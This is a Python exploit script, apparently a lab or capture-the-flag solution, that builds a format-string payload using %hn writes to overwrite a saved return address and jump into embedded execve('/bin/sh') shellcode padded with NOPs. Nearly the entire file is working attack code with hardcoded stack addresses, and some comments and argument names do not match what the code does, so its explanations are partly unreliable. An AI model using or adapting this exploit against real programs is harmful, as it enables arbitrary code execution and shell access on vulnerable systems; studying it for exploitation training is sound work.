def build_fmt_str(target_addr, start_param=22):
    """
    Build a format string to write the 64-bit address 'target_addr' in four
    2-byte segments using %hn. The segments are written to parameters:
    start_param, start_param+1, start_param+2, start_param+3.

    How it works:
    1) We split 'target_addr' into four 16-bit chunks (low to high).
    2) We keep track of how many characters have been "printed" so far
       (the 'printed' variable). Each %hn writes the current printed
       character count into the corresponding memory address.
    3) If the next chunk is smaller than 'printed', we add 0x10000 to
       ensure the printed count always moves forward.
    4) We generate the correct number of padding characters (%{delta}c)
       followed by %<param>$hn to write each chunk.

    Parameters:
        target_addr (int): The 64-bit address we want to write.
        start_param (int): The first parameter index (e.g., 22 means %22$hn).
                           By default, it's 22, but you can adjust as needed.

    Returns:
        bytes: A bytes object containing the generated format string.
    """

    # Extract four 16-bit segments from the 64-bit target_addr
    seg0 =  target_addr        & 0xffff  # lowest 2 bytes
    seg1 = (target_addr >> 16) & 0xffff
    seg2 = (target_addr >> 32) & 0xffff
    seg3 = (target_addr >> 48) & 0xffff
    
    print("seg3 is 0x{:04x}".format(seg3))
    print("seg2 is 0x{:04x}".format(seg2))
    print("seg1 is 0x{:04x}".format(seg1))
    print("seg0 is 0x{:04x}".format(seg0))
    
    
    segments = [seg3, seg2, seg0, seg1]
   

    printed = 0  # Number of characters printed so far
    result = ""

    # Build the format string for each 2-byte segment
    for i, seg in enumerate(segments):
        param_index = start_param + i

        # Calculate how many more characters to print
        delta = seg - printed

        # If delta is non-zero, print that many characters formatted as a 6-digit number (with leading zeros)
        if delta > 0:
            result += f"%{delta:06d}x"
        elif delta == 0:
            # If delta is 0, do nothing (result remains unchanged)
            pass 
        
        # Write the current total number of printed characters (16-bit) into memory
        result += f"%{param_index}$hn"

        # Update the printed count to this segment
        printed = seg
    result += f" "
    return result.encode("latin-1")

def generate_ret_address_bytes(ret_address):
    """
    Given a base address, generate four 8-byte strings corresponding to
    memory addresses at offsets +0x0, +0x2, +0x4, +0x6.

    Parameters:
        base_address (int): The starting memory address.

    Returns:
        list: A list of four 8-byte little-endian byte strings.
    """
    addresses = [
        (ret_address + 0x6).to_bytes(8, 'little'),  # Highest 2 bytes
        (ret_address + 0x4).to_bytes(8, 'little'),  # Second highest 2 bytes
        (ret_address + 0x2).to_bytes(8, 'little'),  # Second lowest 2 bytes
        (ret_address + 0x0).to_bytes(8, 'little')   # Lowest 2 bytes
    ]

    return addresses


shellcode = (
        "\x48\x31\xc0" # xor rax,rax
        "\x50"         # push rax
        "\x48\xbb\x2f\x2f\x62\x69\x6e" # mov rbx, "//bin/sh"
        "\x2f\x73\x68"
        "\x53"         # push rbx
        "\x48\x89\xe7" # mov rdi, rsp
        "\x48\x89\xc6" # mov rsi, rax
        "\x48\x89\xc2" # mov rdx, rax
        "\xb0\x3b"     # mov al, 0x3b
        "\x0f\x05"     # syscall
).encode("latin-1")

length = 200
# fill with NOPs
payload = bytearray(b"\x90" * length)

address_str =  0x7fffffffda90
address_rbp =  0x7fffffffe1e0
address_ret = address_rbp + 8


fmt_str = build_fmt_str(address_ret, start_param=22)
print(fmt_str)
print(fmt_str.decode("latin-1"))


address_bytes = generate_ret_address_bytes(address_ret)
print("Highest 2 bytes:", address_bytes[0])
print("Second highest 2 bytes:", address_bytes[1])
print("Second lowest 2 bytes:", address_bytes[2])
print("Lowest 2 bytes:", address_bytes[3])


payload[0:48] = fmt_str
payload[48:56] = address_bytes[3]  # Highest 2 bytes
payload[56:64] = address_bytes[2]  # Second highest 2 bytes
payload[64:72] = address_bytes[0]  # Lowest 2 bytes
payload[72:80] = address_bytes[1]  # Second lowest 2 bytes
payload[80:80+len(shellcode)] = shellcode

print(payload)